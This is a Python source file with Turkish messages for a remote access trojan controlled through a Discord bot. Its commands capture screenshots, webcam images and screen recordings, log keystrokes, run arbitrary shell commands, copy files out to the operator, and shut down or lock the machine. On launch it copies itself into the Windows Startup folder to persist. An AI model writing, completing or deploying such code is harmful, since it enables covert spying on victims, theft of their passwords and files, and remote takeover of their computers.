import os
import time
import shutil
import threading
import subprocess
import platform
import asyncio
from datetime import datetime

os.system("pip install discord")
os.system("pip install pynput")
os.system("pip install pyautogui")
os.system("pip install opencv-python-headless")
os.system("pip install pyaudio")
os.system("pip install ffmpeg-python")
os.system("pip install psutil")
os.system("pip install tk")
import discord
import psutil
import pyautogui
import cv2
import ffmpeg
import numpy as np
import pyaudio
from tkinter import messagebox, simpledialog
from tkinter import *
from discord.ext import commands
from pynput.keyboard import Key, Controller as KeyboardController, Listener as KeyboardListener
from pynput.mouse import Button, Controller as MouseController
# https://discord.com/developers/applications/
TOKEN = 'ENTER YOUR BOT TOKEN BEFORE USING!'

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

keyboard = KeyboardController()
mouse = MouseController()

@bot.event
async def on_ready():
    print(f'Bot {bot.user} olarak giriş yaptı!')

def open_explorer():
    os.startfile("explorer.exe")

@bot.command()
async def explorer(ctx):
    threading.Thread(target=open_explorer).start()
    await ctx.send("Explorer açıldı.")

def take_screenshot():
    filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

@bot.command()
async def ss(ctx):
    filename = take_screenshot()
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

def take_camera_image():
    filename = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(filename, frame)
    cap.release()
    return filename

@bot.command()
async def cam(ctx):
    filename = take_camera_image()
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

@bot.command()
async def key(ctx, key: str):
    try:
        threading.Thread(target=lambda: keyboard.press(key) or keyboard.release(key)).start()
        await ctx.send(f"{key} tuşuna basıldı.")
    except ValueError:
        await ctx.send(f"Geçersiz tuş: {key}")

@bot.command()
async def altf4(ctx):
    threading.Thread(target=lambda: keyboard.press(Key.alt) or keyboard.press(Key.f4) or keyboard.release(Key.f4) or keyboard.release(Key.alt)).start()
    await ctx.send("Alt+F4 tuş kombinasyonu basıldı.")

@bot.command()
async def mouse1(ctx):
    threading.Thread(target=lambda: mouse.click(Button.right)).start()
    await ctx.send("Mouse sağ tıklaması yapıldı.")

@bot.command()
async def mouse2(ctx):
    threading.Thread(target=lambda: mouse.click(Button.left)).start()
    await ctx.send("Mouse sol tıklaması yapıldı.")
@bot.command()
async def ask(ctx, *, soru: str):
    async def sor_ve_cevapla():
        try:
            cevap = simpledialog.askstring("Soru", soru)
            if cevap:
                await ctx.send(f"Girilen Cevap: {cevap}")
            else:
                await ctx.send("Kullanıcı cevap vermedi.")
        except Exception as e:
            await ctx.send(f"Soru sorulurken bir hata oluştu: {str(e)}")
    bot.loop.create_task(sor_ve_cevapla())

@bot.command()
async def copy(ctx, dir: str):
    if os.path.exists(dir):
        shutil.copy(dir, ".")
        await ctx.send(file=discord.File(os.path.basename(dir)))
    else:
        await ctx.send("Dosya bulunamadı.")

@bot.command()
async def pull(ctx):
    for attachment in ctx.message.attachments:
        await attachment.save(attachment.filename)
        shutil.move(attachment.filename, os.path.join(os.path.expanduser("~/Desktop"), attachment.filename))
    await ctx.send("Dosya masaüstüne taşındı.")

@bot.command()
async def open(ctx, dir: str):
    if os.path.exists(dir):
        os.startfile(dir)
        await ctx.send(f"{dir} dosyası açıldı.")
    else:
        await ctx.send("Dosya bulunamadı.")

def run_shell_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout, result.stderr

@bot.command()
async def shell(ctx, *, command: str):
    async def execute_and_send():
        stdout, stderr = run_shell_command(command)
        if stdout:
            await ctx.send(f"Komut çıktısı:\n```\n{stdout}\n```")
        if stderr:
            await ctx.send(f"Hata mesajı:\n```\n{stderr}\n```")
    bot.loop.create_task(execute_and_send())
@bot.command()
async def msgbox(ctx, *, message: str):
    async def show_messagebox():   
        try:
            messagebox.showinfo("PYRO Tools", message)
            await ctx.send(f"{message} mesajı **başarıyla** gösterildi.")
        except Exception as e:
            await ctx.send(f"Mesaj kutusu gösterilirken bir hata oluştu: {str(e)}")
    bot.loop.create_task(show_messagebox())

@bot.command()
async def wallpaper(ctx):
    for attachment in ctx.message.attachments:
        await attachment.save(attachment.filename)
        command = f"reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d {os.path.abspath(attachment.filename)} /f"
        subprocess.run(command, shell=True)
        subprocess.run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", shell=True)
        await ctx.send("Duvar kağıdı güncellendi.")

@bot.command()
async def reboot(ctx):
    await ctx.send("Bilgisayar yeniden başlatılıyor.")
    threading.Thread(target=lambda: subprocess.run("shutdown /r /t 0", shell=True)).start()

@bot.command()
async def shutdown(ctx):
    await ctx.send("Bilgisayar kapatılıyor.")
    threading.Thread(target=lambda: subprocess.run("shutdown /s /t 0", shell=True)).start()

@bot.command()
async def lock(ctx):
    await ctx.send("Bilgisayar kilitleniyor.")
    threading.Thread(target=lambda: subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)).start()

@bot.command()
async def type(ctx, *, text: str):
    threading.Thread(target=lambda: keyboard.type(text)).start()
    await ctx.send(f"Yazıldı: {text}")

@bot.command()
async def volume_up(ctx):
    threading.Thread(target=lambda: [keyboard.press(Key.media_volume_up) or keyboard.release(Key.media_volume_up) for _ in range(5)]).start()
    await ctx.send("Ses artırıldı.")

@bot.command()
async def volume_down(ctx):
    threading.Thread(target=lambda: [keyboard.press(Key.media_volume_down) or keyboard.release(Key.media_volume_down) for _ in range(5)]).start()
    await ctx.send("Ses azaltıldı.")

@bot.command()
async def mute(ctx):
    threading.Thread(target=lambda: keyboard.press(Key.media_volume_mute) or keyboard.release(Key.media_volume_mute)).start()
    await ctx.send("Ses kapatıldı.")

@bot.command()
async def sleep(ctx):
    await ctx.send("Bilgisayar uyku moduna alınıyor.")
    if platform.system() == "Windows":
        threading.Thread(target=lambda: subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)).start()

key_log = []
def on_press(key):
    try:
        key_log.append(key.char)
    except AttributeError:
        key_log.append(str(key))

@bot.command()
async def logkeys(ctx):
    await ctx.send("Tuş kaydı başlatıldı. 60 saniye boyunca tuşlar kaydedilecek.")
    key_log.clear()
    listener = KeyboardListener(on_press=on_press)
    listener.start()
    time.sleep(60)
    listener.stop()
    await ctx.send(f"Tuş kaydı: {''.join(key_log)}")

@bot.command()
async def sysinfo(ctx):
    uname = platform.uname()
    sys_info = (
        f"System: {uname.system}\n"
        f"Node Name: {uname.node}\n"
        f"Release: {uname.release}\n"
        f"Version: {uname.version}\n"
        f"Machine: {uname.machine}\n"
        f"Processor: {uname.processor}"
    )
    await ctx.send(f"Sistem Bilgileri:\n```\n{sys_info}\n```")

@bot.command()
async def listdir(ctx, dir: str = '.'):
    if os.path.exists(dir):
        files = os.listdir(dir)
        await ctx.send(f"```\n{', '.join(files)}\n```")
    else:
        await ctx.send("Dizin bulunamadı.")

@bot.command()
async def uptime(ctx):
    current_time = time.time()
    boot_time = psutil.boot_time()
    uptime_seconds = current_time - boot_time
    uptime_string = str(datetime.timedelta(seconds=uptime_seconds))
    await ctx.send(f"Sistem çalışma süresi: {uptime_string}")

@bot.command()
async def killproc(ctx, pid: int):
    try:
        os.kill(pid, 9)
        await ctx.send(f"Process {pid} sonlandırıldı.")
    except Exception as e:
        await ctx.send(f"Process sonlandırma hatası: {e}")

@bot.command()
async def meminfo(ctx):
    mem = psutil.virtual_memory()
    mem_info = (
        f"Toplam: {mem.total >> 20} MB\n"
        f"Kullanılan: {mem.used >> 20} MB\n"
        f"Serbest: {mem.free >> 20} MB\n"
        f"Yüzde: {mem.percent}%"
    )
    await ctx.send(f"Bellek Bilgisi:\n```\n{mem_info}\n```")

@bot.command()
async def cpuinfo(ctx):
    cpu_times = psutil.cpu_times()
    cpu_info = (
        f"Kullanıcı: {cpu_times.user} seconds\n"
        f"Sistem: {cpu_times.system} seconds\n"
        f"Boşta: {cpu_times.idle} seconds"
    )
    await ctx.send(f"CPU Bilgisi:\n```\n{cpu_info}\n```")

def record_screen(duration=10, output="screen_record.mp4"):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(output, fourcc, 20.0, screen_size)
    
    start_time = time.time()
    while time.time() - start_time < duration:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    
    out.release()

@bot.command()
async def screenrec(ctx, duration: int = 10):
    output = f"screen_record_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
    threading.Thread(target=record_screen, args=(duration, output)).start()
    await asyncio.sleep(duration + 2) 
    await ctx.send(file=discord.File(output))
    os.remove(output)

def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_path = os.path.abspath(__file__)
    if not os.path.exists(os.path.join(startup_path, os.path.basename(script_path))):
        shutil.copy(script_path, startup_path)

def prevent_shutdown():
    while True:
        time.sleep(1)
        if not bot.is_closed():
            bot.loop.create_task(bot.close())
            subprocess.run("shutdown /a", shell=True)

add_to_startup()

bot.run(TOKEN)
